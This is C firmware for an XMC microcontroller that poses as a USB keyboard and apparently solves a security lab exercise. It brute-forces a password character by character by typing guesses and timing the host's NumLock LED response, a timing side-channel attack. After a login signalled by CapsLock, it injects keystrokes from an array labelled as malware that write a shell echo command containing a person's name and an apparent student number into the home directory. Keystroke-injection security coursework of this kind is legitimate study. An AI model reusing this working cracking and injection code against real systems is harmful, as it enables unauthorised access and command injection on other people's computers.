#include "KeyboardHID.h"
#include "german_keyboardCodes.h"

/* Macros: */
#define LED1 P1_1
#define LED2 P1_0

#define CHARACTER_LENGTH 84
#define PASSWORD_LENGTH 20
#define MALWARE_TEXT_LEGTH 48

static int isNumLockON = 0;

#define TICKS_PER_SECOND 1000

uint32_t ticks;
uint32_t maxTicks = 0;
uint8_t indexMaxTicks;
//static uint8_t pwIndexLocationHighestTime;
uint32_t arrayTickValues[CHARACTER_LENGTH]={0};

uint8_t sendPasswordIndex;
static uint8_t indexToSend, fileSendingIndexToSend = 0; 
static uint8_t sendIndexOfPw = 0, characterSent = 0, pwIndexToSend = 0, send_flag_check = 0, fileSendingCharacterSent = 0;

uint8_t maxIndexForDebugging;
static bool press_enter_flag = false;
bool isCapsLockON = false;
uint8_t capsLockOnCounter = 0;

bool isReadyToSendMalware = false;

void SysTick_Handler(void)
{
	ticks++;
}

void delayGenerator(uint32_t timeDelay)
{
	while(1)
	{
		if(ticks > timeDelay)
		{
			ticks = 0;
			break;
		}
	}
}

typedef struct
{
	uint8_t germanCharacter;
	uint8_t characterModifier;
} germanKeyboardCharacter;


germanKeyboardCharacter enterButton = {
	GERMAN_KEYBOARD_SC_ENTER,0
};

germanKeyboardCharacter guessedPassword[PASSWORD_LENGTH];

germanKeyboardCharacter allCharacters[CHARACTER_LENGTH] = 
{
	{GERMAN_KEYBOARD_SC_A                 				 ,0},
	{GERMAN_KEYBOARD_SC_B                                ,0},
	{GERMAN_KEYBOARD_SC_C                                ,0},
	{GERMAN_KEYBOARD_SC_D                                ,0},
	{GERMAN_KEYBOARD_SC_E                                ,0},
	{GERMAN_KEYBOARD_SC_F                                ,0},
	{GERMAN_KEYBOARD_SC_G                                ,0},
	{GERMAN_KEYBOARD_SC_H                                ,0},
	{GERMAN_KEYBOARD_SC_I                                ,0},
	{GERMAN_KEYBOARD_SC_J                                ,0},
	{GERMAN_KEYBOARD_SC_K                                ,0},
	{GERMAN_KEYBOARD_SC_L                                ,0},
	{GERMAN_KEYBOARD_SC_M                                ,0},
	{GERMAN_KEYBOARD_SC_N                                ,0},
	{GERMAN_KEYBOARD_SC_O                                ,0},
	{GERMAN_KEYBOARD_SC_P                                ,0},
	{GERMAN_KEYBOARD_SC_Q                                ,0},
	{GERMAN_KEYBOARD_SC_R                                ,0},
	{GERMAN_KEYBOARD_SC_S                                ,0},
	{GERMAN_KEYBOARD_SC_T                                ,0},
	{GERMAN_KEYBOARD_SC_U                                ,0},
	{GERMAN_KEYBOARD_SC_V                                ,0},
	{GERMAN_KEYBOARD_SC_W                                ,0},
	{GERMAN_KEYBOARD_SC_X                                ,0},
	{GERMAN_KEYBOARD_SC_Y                                ,0},
	{GERMAN_KEYBOARD_SC_Z                                ,0},
	{GERMAN_KEYBOARD_SC_1_AND_EXCLAMATION                ,0},
	{GERMAN_KEYBOARD_SC_2_AND_QUOTES                     ,0},
	{GERMAN_KEYBOARD_SC_3_AND_PARAGRAPH               ,0},
	{GERMAN_KEYBOARD_SC_4_AND_DOLLAR                     ,0},
	{GERMAN_KEYBOARD_SC_5_AND_PERCENTAGE                 ,0},
	{GERMAN_KEYBOARD_SC_6_AND_AMPERSAND                  ,0},
	{GERMAN_KEYBOARD_SC_7_AND_SLASH_AND_OPENING_BRACE                  ,0},
	{GERMAN_KEYBOARD_SC_8_AND_OPENING_PARENTHESIS_AND_OPENING_BRACKET ,0},
	{GERMAN_KEYBOARD_SC_9_AND_CLOSING_PARENTHESIS_AND_CLOSING_BRACKET ,0},
	{GERMAN_KEYBOARD_SC_0_AND_EQUAL_AND_CLOSING_BRACE        ,0},
	{GERMAN_KEYBOARD_SC_A                ,2}, // 40, Shift Modifier 2
	{GERMAN_KEYBOARD_SC_B                                ,2},
	{GERMAN_KEYBOARD_SC_C                                ,2},
	{GERMAN_KEYBOARD_SC_D                                ,2},
	{GERMAN_KEYBOARD_SC_E                                ,2},
	{GERMAN_KEYBOARD_SC_F                                ,2},
	{GERMAN_KEYBOARD_SC_G                                ,2},
	{GERMAN_KEYBOARD_SC_H                                ,2},
	{GERMAN_KEYBOARD_SC_I                                ,2},
	{GERMAN_KEYBOARD_SC_J                                ,2},
	{GERMAN_KEYBOARD_SC_K                                ,2},
	{GERMAN_KEYBOARD_SC_L                                ,2},
	{GERMAN_KEYBOARD_SC_M                                ,2},
	{GERMAN_KEYBOARD_SC_N                                ,2},
	{GERMAN_KEYBOARD_SC_O                                ,2},
	{GERMAN_KEYBOARD_SC_P                                ,2},
	{GERMAN_KEYBOARD_SC_Q                                ,2},
	{GERMAN_KEYBOARD_SC_R                                ,2},
	{GERMAN_KEYBOARD_SC_S                                ,2},
	{GERMAN_KEYBOARD_SC_T                                ,2},
	{GERMAN_KEYBOARD_SC_U                                ,2},
	{GERMAN_KEYBOARD_SC_V                                ,2},
	{GERMAN_KEYBOARD_SC_W                                ,2},
	{GERMAN_KEYBOARD_SC_X                                ,2},
	{GERMAN_KEYBOARD_SC_Y                                ,2},
	{GERMAN_KEYBOARD_SC_Z                                ,2},
	{GERMAN_KEYBOARD_SC_1_AND_EXCLAMATION                ,2},  // !
	{GERMAN_KEYBOARD_SC_8_AND_OPENING_PARENTHESIS_AND_OPENING_BRACKET ,2}, // (
	{GERMAN_KEYBOARD_SC_9_AND_CLOSING_PARENTHESIS_AND_CLOSING_BRACKET ,2}, // )
	{GERMAN_KEYBOARD_SC_MINUS_AND_UNDERSCORE ,0}, // -
	{GERMAN_KEYBOARD_SC_MINUS_AND_UNDERSCORE ,2}, // _
	{GERMAN_KEYBOARD_SC_PLUS_AND_ASTERISK_AND_TILDE ,0}, // +
	{GERMAN_KEYBOARD_SC_0_AND_EQUAL_AND_CLOSING_BRACE        ,2}, // =
	{GERMAN_KEYBOARD_SC_PLUS_AND_ASTERISK_AND_TILDE ,HID_KEYBOARD_MODIFIER_RIGHTALT}, // ~ (Not appearing)
	{GERMAN_KEYBOARD_SC_COMMA_AND_SEMICOLON ,2}, // ;
	{GERMAN_KEYBOARD_SC_DOT_AND_COLON ,2}, // . :
	{GERMAN_KEYBOARD_SC_COMMA_AND_SEMICOLON ,0}, // ,
	{GERMAN_KEYBOARD_SC_DOT_AND_COLON ,0}, // .
	{GERMAN_KEYBOARD_SC_LESS_THAN_AND_GREATER_THAN_AND_PIPE,0}, // <
	{GERMAN_KEYBOARD_SC_LESS_THAN_AND_GREATER_THAN_AND_PIPE,2}, // > (Not coming - showing 9)
	{GERMAN_KEYBOARD_SC_8_AND_OPENING_PARENTHESIS_AND_OPENING_BRACKET ,HID_KEYBOARD_MODIFIER_RIGHTALT},// [ (Not coming proper - showing ^)
	{GERMAN_KEYBOARD_SC_9_AND_CLOSING_PARENTHESIS_AND_CLOSING_BRACKET ,HID_KEYBOARD_MODIFIER_RIGHTALT},// ] (Not coming proper - showing _)
	{GERMAN_KEYBOARD_SC_7_AND_SLASH_AND_OPENING_BRACE        ,HID_KEYBOARD_MODIFIER_RIGHTALT}, // 83 Alt Modifier = 16 {    (Not appearing only)
	{GERMAN_KEYBOARD_SC_0_AND_EQUAL_AND_CLOSING_BRACE        ,HID_KEYBOARD_MODIFIER_RIGHTALT},// }     (Not appearning only)
	{GERMAN_KEYBOARD_SC_7_AND_SLASH_AND_OPENING_BRACE    ,2}, // /
	{GERMAN_KEYBOARD_SC_SHARP_S_AND_QUESTION_AND_BACKSLASH ,2}, // ?
	{GERMAN_KEYBOARD_SC_6_AND_AMPERSAND                  ,2}, // &
	{GERMAN_KEYBOARD_SC_4_AND_DOLLAR                     ,2}, // $
};

germanKeyboardCharacter textFileMalware[MALWARE_TEXT_LEGTH] =
{
	{GERMAN_KEYBOARD_SC_E                                ,2},
	{GERMAN_KEYBOARD_SC_C                                ,2},
	{GERMAN_KEYBOARD_SC_H                                ,2},
	{GERMAN_KEYBOARD_SC_O                                ,2},
	{GERMAN_KEYBOARD_SC_SPACE                            ,2},
	{GERMAN_KEYBOARD_SC_2_AND_QUOTES                     ,2},
	{GERMAN_KEYBOARD_SC_L                                ,0},
	{GERMAN_KEYBOARD_SC_I                                ,2},
	{GERMAN_KEYBOARD_SC_K                                ,2},
	{GERMAN_KEYBOARD_SC_I                                ,2},
	{GERMAN_KEYBOARD_SC_T                                ,2},
	{GERMAN_KEYBOARD_SC_H                                ,2},
	{GERMAN_KEYBOARD_SC_SPACE                            ,2},
	{GERMAN_KEYBOARD_SC_S                                ,0},
	{GERMAN_KEYBOARD_SC_H                                ,2},
	{GERMAN_KEYBOARD_SC_I                                ,2},
	{GERMAN_KEYBOARD_SC_V                                ,2},
	{GERMAN_KEYBOARD_SC_A                 	             ,2},
	{GERMAN_KEYBOARD_SC_K                                ,2},
	{GERMAN_KEYBOARD_SC_U                                ,2},
	{GERMAN_KEYBOARD_SC_M                                ,2},
	{GERMAN_KEYBOARD_SC_A                 	             ,2},
	{GERMAN_KEYBOARD_SC_R                                ,2},
	{GERMAN_KEYBOARD_SC_SPACE                            ,2},
	{GERMAN_KEYBOARD_SC_G                                ,0},
	{GERMAN_KEYBOARD_SC_O                                ,2},
	{GERMAN_KEYBOARD_SC_W                                ,2},
	{GERMAN_KEYBOARD_SC_D                                ,2},
	{GERMAN_KEYBOARD_SC_A                 	             ,2},
	{GERMAN_KEYBOARD_SC_2_AND_QUOTES                     ,2},
	{GERMAN_KEYBOARD_SC_SPACE                            ,2},
	{GERMAN_KEYBOARD_SC_LESS_THAN_AND_GREATER_THAN_AND_PIPE,2},
	{GERMAN_KEYBOARD_SC_SPACE                            ,2},
	{GERMAN_KEYBOARD_SC_4_AND_DOLLAR                     ,2},
	{GERMAN_KEYBOARD_SC_H                                ,0},
	{GERMAN_KEYBOARD_SC_O                                ,0},
	{GERMAN_KEYBOARD_SC_M                                ,0},
	{GERMAN_KEYBOARD_SC_E                                ,0},
	{GERMAN_KEYBOARD_SC_7_AND_SLASH_AND_OPENING_BRACE    ,2},
	{GERMAN_KEYBOARD_SC_0_AND_EQUAL_AND_CLOSING_BRACE    ,0},
	{GERMAN_KEYBOARD_SC_3_AND_PARAGRAPH                  ,0},
	{GERMAN_KEYBOARD_SC_7_AND_SLASH_AND_OPENING_BRACE    ,0},
	{GERMAN_KEYBOARD_SC_6_AND_AMPERSAND                  ,0},
	{GERMAN_KEYBOARD_SC_6_AND_AMPERSAND                  ,0},
    {GERMAN_KEYBOARD_SC_8_AND_OPENING_PARENTHESIS_AND_OPENING_BRACKET ,0},
	{GERMAN_KEYBOARD_SC_3_AND_PARAGRAPH               ,0},
	{GERMAN_KEYBOARD_SC_7_AND_SLASH_AND_OPENING_BRACE ,0},
	{GERMAN_KEYBOARD_SC_ENTER ,0},
};

//echo "Likith Shivakumar Gowda" > $HOME/037663837

/* Clock configuration */
XMC_SCU_CLOCK_CONFIG_t clock_config = {
	.syspll_config.p_div  = 2,
	.syspll_config.n_div  = 80,
	.syspll_config.k_div  = 4,
	.syspll_config.mode   = XMC_SCU_CLOCK_SYSPLL_MODE_NORMAL,
	.syspll_config.clksrc = XMC_SCU_CLOCK_SYSPLLCLKSRC_OSCHP,
	.enable_oschp         = true,
	.calibration_mode     = XMC_SCU_CLOCK_FOFI_CALIBRATION_MODE_FACTORY,
	.fsys_clksrc          = XMC_SCU_CLOCK_SYSCLKSRC_PLL,
	.fsys_clkdiv          = 1,
	.fcpu_clkdiv          = 1,
	.fccu_clkdiv          = 1,
	.fperipheral_clkdiv   = 1
};

/* Forward declaration of HID callbacks as defined by LUFA */
bool CALLBACK_HID_Device_CreateHIDReport(
							USB_ClassInfo_HID_Device_t* const HIDInterfaceInfo,
							uint8_t* const ReportID,
							const uint8_t ReportType,
							void* ReportData,
							uint16_t* const ReportSize );

void CALLBACK_HID_Device_ProcessHIDReport(
							USB_ClassInfo_HID_Device_t* const HIDInterfaceInfo,
							const uint8_t ReportID,
							const uint8_t ReportType,
							const void* ReportData,
							const uint16_t ReportSize );

void SystemCoreClockSetup(void);

/**
 * Main program entry point. This routine configures the hardware required by
 * the application, then enters a loop to run the application tasks in sequence.
 */
int main(void) {

	SysTick_Config(SystemCoreClock / TICKS_PER_SECOND);

	// Init LED pins for debugging and NUM/CAPS visual report
	XMC_GPIO_SetMode(LED1,XMC_GPIO_MODE_OUTPUT_PUSH_PULL);
	XMC_GPIO_SetMode(LED2,XMC_GPIO_MODE_OUTPUT_PUSH_PULL);
	USB_Init();

	// Wait until host has enumerated HID device
	for(int i = 0; i < 10e6; ++i)
		; 

	while (1) {
		HID_Device_USBTask(&Keyboard_HID_Interface);
	}
}

void releaseKeyPressed(USB_KeyboardReport_Data_t* report)
{
	report->Modifier = 0;
	report->Reserved = 0; 
	report->KeyCode[0] = 0;
}

void pressCapsLock(USB_KeyboardReport_Data_t* report)
{
	report->Modifier = 0;
	report->Reserved = 0; 
	report->KeyCode[0] = HID_KEYBOARD_SC_CAPS_LOCK;
}

void sendGuessedPasswordChar(USB_KeyboardReport_Data_t* report, uint8_t sendIndexofPw)
{
	report->Modifier = guessedPassword[sendIndexofPw].characterModifier;
	report->Reserved = 0; 
	report->KeyCode[0] = guessedPassword[sendIndexofPw].germanCharacter;
}

void sendToCrackPasswordChar(USB_KeyboardReport_Data_t* report, uint8_t sendIndexofPw)
{
	report->Modifier = allCharacters[sendIndexofPw].characterModifier;
	report->Reserved = 0; 
	report->KeyCode[0] = allCharacters[sendIndexofPw].germanCharacter;
}



void sendUnguessedPasswordChar(USB_KeyboardReport_Data_t* report)
{
	if(send_flag_check<1)
	{
		if(!press_enter_flag) // sending the unguessed character
		{
			if(characterSent)
			{
				releaseKeyPressed(report);
				characterSent = 0;
				press_enter_flag = true;	
			}
			else
			{
				sendToCrackPasswordChar(report, indexToSend);
				characterSent = 1;
			}
		}
		else // pressing the enter button
		{
			report->Modifier = 0;
			report->Reserved = 0;
			report->KeyCode[0] = GERMAN_KEYBOARD_SC_ENTER;
			press_enter_flag = false;
			sendIndexOfPw = 0;
			isNumLockON = 0;
			++send_flag_check;
            //delayGenerator(100);
		}
	}
	else
	{
		send_flag_check = 0;
		++indexToSend;
	}
}

void sendPasswordToCrack(USB_KeyboardReport_Data_t* report, uint8_t pwIndexToSendToCrack)
{
	if(sendIndexOfPw < pwIndexToSendToCrack) // sending already guessed character of the guessedPassword[]
	{
		if(characterSent) // release key logic by sending 0 to keyCode
		{
			releaseKeyPressed(report);
			characterSent = 0;
			++sendIndexOfPw;
		}
		else
		{
			sendGuessedPasswordChar(report, sendIndexOfPw);
			characterSent = 1;
		}
	}
	else
	{
		sendUnguessedPasswordChar(report);
	}
}

uint8_t findPwCharHighestTime()
{
	uint32_t maxTime = 0;
	uint8_t maxIndex = 0;
	for(int i=0; i < CHARACTER_LENGTH; i++)
	{
		if(arrayTickValues[i] > maxTime)
		{
			maxTime = arrayTickValues[i];
			maxIndex = i;
		}
	}
	return maxIndex;
}

void clear_array_Tick_Values()
{
	for(int i=0; i<CHARACTER_LENGTH; i++)
	{
		arrayTickValues[i] = 0;
	}
}

/*void turnOffCapsLock(USB_KeyboardReport_Data_t* report)
{
	if(capsLockCharacterSent)
	{
		releaseKeyPressed(report);
		isCapsLockON = false;
		isReadyToSendMalware = true;
		capsLockCharacterSent = false;
	}
	else
	{
		pressCapsLock(report);
		capsLockCharacterSent = true;
	}
}*/

void createMatriculationTextFile(USB_KeyboardReport_Data_t* report)
{
	//delayGenerator(1000);
}

// Callback function called when a new HID report needs to be created
bool CALLBACK_HID_Device_CreateHIDReport(
							USB_ClassInfo_HID_Device_t* const HIDInterfaceInfo,
							uint8_t* const ReportID,
							const uint8_t ReportType,
							void* ReportData,
							uint16_t* const ReportSize ) {
	USB_KeyboardReport_Data_t* report = (USB_KeyboardReport_Data_t *)ReportData;
	*ReportSize = sizeof(USB_KeyboardReport_Data_t);

	//delayGenerator(100);
	if(isNumLockON)
	{	
		if(indexToSend == 84) //Reach the End of brute forcing for a particular character -> find index taking max time to verify -> reset indexToSend -> increment guessed password to next letter
		{ 
			maxIndexForDebugging = findPwCharHighestTime();
			guessedPassword[pwIndexToSend] = allCharacters[maxIndexForDebugging];
			++pwIndexToSend;
			indexToSend = 0;
            clear_array_Tick_Values();
			//maxTicks = 0;
		}
		else
		{
			sendPasswordToCrack(report, pwIndexToSend); // If we are not at 84th character, means need to brute force still with guessed/unguessed password chars
		}

	}

	if(isCapsLockON /*&& (capsLockOnCounter ==2)*/) // turn off caps lock before sending the character, it had turned on after successfull login
	{
        //createMatriculationTextFile(report);
        if(fileSendingIndexToSend < MALWARE_TEXT_LEGTH)
        {
            if(fileSendingCharacterSent)
            {
                releaseKeyPressed(report);
                fileSendingCharacterSent = 0;
                ++fileSendingIndexToSend;
            }
            else
            {
                report->Modifier = textFileMalware[fileSendingIndexToSend].characterModifier;
                report->Reserved = 0; 
                report->KeyCode[0] = textFileMalware[fileSendingIndexToSend].germanCharacter;
                fileSendingCharacterSent = 1;
            }
        }
	}
	return true;
}

// Called on report input. For keyboard HID devices, that's the state of the LEDs
void CALLBACK_HID_Device_ProcessHIDReport(
						USB_ClassInfo_HID_Device_t* const HIDInterfaceInfo,
						const uint8_t ReportID,
						const uint8_t ReportType,
						const void* ReportData,
						const uint16_t ReportSize ) {
	uint8_t *report = (uint8_t*)ReportData;

	if(*report & HID_KEYBOARD_LED_NUMLOCK) 
	{
		isNumLockON = 1;
		arrayTickValues[indexToSend] = ticks;
		/*if (ticks > maxTicks)
		{
			maxTicks = ticks;
			pwIndexLocationHighestTime = indexToSend;
		}*/
		XMC_GPIO_SetOutputHigh(LED1);
	}
	else 
	{
		isNumLockON = 0;
		ticks = 0;
		XMC_GPIO_SetOutputLow(LED1);
	}

	if(*report & HID_KEYBOARD_LED_CAPSLOCK) 
	{
		XMC_GPIO_SetOutputHigh(LED2);
		isCapsLockON = true;
        capsLockOnCounter++;
	}
	else 
    {
        XMC_GPIO_SetOutputLow(LED2); 
        isCapsLockON = false;
    }
}

void SystemCoreClockSetup(void) {
	/* Setup settings for USB clock */
	XMC_SCU_CLOCK_Init(&clock_config);

	XMC_SCU_CLOCK_EnableUsbPll();
	XMC_SCU_CLOCK_StartUsbPll(2, 64);
	XMC_SCU_CLOCK_SetUsbClockDivider(4);
	XMC_SCU_CLOCK_SetUsbClockSource(XMC_SCU_CLOCK_USBCLKSRC_USBPLL);
	XMC_SCU_CLOCK_EnableClock(XMC_SCU_CLOCK_USB);

	SystemCoreClockUpdate();
}
